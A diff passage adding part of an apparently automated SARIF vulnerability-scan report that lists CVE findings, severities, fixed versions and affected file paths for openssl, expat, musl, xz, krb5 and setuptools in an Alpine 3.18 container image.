+                "artifactLocation": {
+                  "uri": "/usr/lib/ossl-modules/legacy.so"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-6119",
+          "ruleIndex": 23,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Vulnerability    :CVE-2024-6119                                                   \nSeverity         :HIGH                                                            \nPackage          :pkg:apk/alpine/openssl@3.1.4-r5?os_name=alpine&os_version=3.18  \nAffected range   :<3.1.7-r0                                                       \nFixed version    :3.1.7-r0                                                        \nEPSS Score       :0.142580                                                        \nEPSS Percentile  :0.944520                                                        \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/ct_log_list.cnf"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/ct_log_list.cnf.dist"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/misc/CA.pl"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/misc/tsget.pl"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/openssl.cnf"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/openssl.cnf.dist"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/libcrypto.so.3"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/libssl.so.3"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/afalg.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/capi.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/loader_attic.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/padlock.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/ossl-modules/legacy.so"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-6345",
+          "ruleIndex": 24,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Vulnerability    :CVE-2024-6345                                                    \nSeverity         :HIGH                                                             \nPackage          :pkg:pypi/setuptools@58.1.0                                       \nAffected range   :<70.0.0                                                          \nFixed version    :70.0.0                                                           \nCVSS Score       :7.5                                                              \nCVSS Vector      :CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N  \nEPSS Score       :0.055530                                                         \nEPSS Percentile  :0.903430                                                         \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/setuptools-58.1.0.dist-info/METADATA"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/setuptools-58.1.0.dist-info/RECORD"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/setuptools-58.1.0.dist-info/top_level.txt"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-8176",
+          "ruleIndex": 25,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Vulnerability    :CVE-2024-8176                                                 \nSeverity         :HIGH                                                          \nPackage          :pkg:apk/alpine/expat@2.6.2-r0?os_name=alpine&os_version=3.18  \nAffected range   :<2.7.0-r0                                                     \nFixed version    :2.7.0-r0                                                      \nEPSS Score       :0.008030                                                      \nEPSS Percentile  :0.742160                                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libexpat.so.1.9.2"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-47273",
+          "ruleIndex": 26,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Vulnerability    :CVE-2025-47273                                                       \nSeverity         :HIGH                                                                 \nPackage          :pkg:pypi/setuptools@58.1.0                                           \nAffected range   :<78.1.1                                                              \nFixed version    :78.1.1                                                               \nCVSS Score       :7.7                                                                  \nCVSS Vector      :CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P  \nEPSS Score       :0.004870                                                             \nEPSS Percentile  :0.655230                                                             \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/setuptools-58.1.0.dist-info/METADATA"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/setuptools-58.1.0.dist-info/RECORD"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/setuptools-58.1.0.dist-info/top_level.txt"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-26519",
+          "ruleIndex": 27,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Vulnerability    :CVE-2025-26519                                               \nSeverity         :HIGH                                                         \nPackage          :pkg:apk/alpine/musl@1.2.4-r2?os_name=alpine&os_version=3.18  \nAffected range   :<1.2.4-r3                                                    \nFixed version    :1.2.4-r3                                                     \nEPSS Score       :0.000340                                                     \nEPSS Percentile  :0.101840                                                     \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/ld-musl-x86_64.so.1"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/sbin/ldconfig"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/bin/getconf"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/bin/getent"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/bin/iconv"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/bin/ldd"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2022-40897",
+          "ruleIndex": 28,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Vulnerability    :CVE-2022-40897                                                   \nSeverity         :HIGH                                                             \nPackage          :pkg:pypi/setuptools@58.1.0                                       \nAffected range   :<65.5.1                                                          \nFixed version    :65.5.1                                                           \nCVSS Score       :8.7                                                              \nCVSS Vector      :CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:L/SI:L/SA:N  \nEPSS Score       :0.005130                                                         \nEPSS Percentile  :0.666160                                                         \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/setuptools-58.1.0.dist-info/METADATA"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/setuptools-58.1.0.dist-info/RECORD"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/local/lib/python3.9/site-packages/setuptools-58.1.0.dist-info/top_level.txt"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2025-31115",
+          "ruleIndex": 29,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Vulnerability    :CVE-2025-31115                                             \nSeverity         :HIGH                                                       \nPackage          :pkg:apk/alpine/xz@5.4.3-r0?os_name=alpine&os_version=3.18  \nAffected range   :<5.4.3-r1                                                  \nFixed version    :5.4.3-r1                                                   \nEPSS Score       :0.000410                                                   \nEPSS Percentile  :0.125130                                                   \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/liblzma.so.5.4.3"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-37371",
+          "ruleIndex": 30,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Vulnerability    :CVE-2024-37371                                                \nSeverity         :CRITICAL                                                      \nPackage          :pkg:apk/alpine/krb5@1.20.1-r1?os_name=alpine&os_version=3.18  \nAffected range   :<1.20.2-r1                                                    \nFixed version    :1.20.2-r1                                                     \nEPSS Score       :0.026060                                                      \nEPSS Percentile  :0.857490                                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/krb5/plugins/kdb/db2.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/krb5/plugins/preauth/otp.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/krb5/plugins/preauth/spake.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/krb5/plugins/preauth/test.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/krb5/plugins/tls/k5tls.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libgssapi_krb5.so.2.2"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libgssrpc.so.4.2"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libk5crypto.so.3.1"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libkadm5clnt_mit.so.12.0"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libkadm5srv_mit.so.12.0"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libkdb5.so.10.0"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libkrad.so.0.0"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libkrb5.so.3.3"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libkrb5support.so.0.1"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-5535",
+          "ruleIndex": 31,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Vulnerability    :CVE-2024-5535                                                   \nSeverity         :CRITICAL                                                        \nPackage          :pkg:apk/alpine/openssl@3.1.4-r5?os_name=alpine&os_version=3.18  \nAffected range   :<3.1.6-r0                                                       \nFixed version    :3.1.6-r0                                                        \nEPSS Score       :0.050500                                                        \nEPSS Percentile  :0.898400                                                        \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/ct_log_list.cnf"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/ct_log_list.cnf.dist"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/misc/CA.pl"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/misc/tsget.pl"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/openssl.cnf"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/etc/ssl/openssl.cnf.dist"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/libcrypto.so.3"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/libssl.so.3"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/afalg.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/capi.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/loader_attic.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/engines-3/padlock.so"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/ossl-modules/legacy.so"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-45491",
+          "ruleIndex": 32,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Vulnerability    :CVE-2024-45491                                                \nSeverity         :CRITICAL                                                      \nPackage          :pkg:apk/alpine/expat@2.6.2-r0?os_name=alpine&os_version=3.18  \nAffected range   :<2.6.3-r0                                                     \nFixed version    :2.6.3-r0                                                      \nEPSS Score       :0.011430                                                      \nEPSS Percentile  :0.785840                                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libexpat.so.1.9.2"
+                }
+              }
+            }
+          ]
+        },
+        {
+          "ruleId": "CVE-2024-45492",
+          "ruleIndex": 33,
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Vulnerability    :CVE-2024-45492                                                \nSeverity         :CRITICAL                                                      \nPackage          :pkg:apk/alpine/expat@2.6.2-r0?os_name=alpine&os_version=3.18  \nAffected range   :<2.6.3-r0                                                     \nFixed version    :2.6.3-r0                                                      \nEPSS Score       :0.022690                                                      \nEPSS Percentile  :0.847690                                                      \n"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/lib/apk/db/installed"
+                }
+              }
+            },
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "/usr/lib/libexpat.so.1.9.2"
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
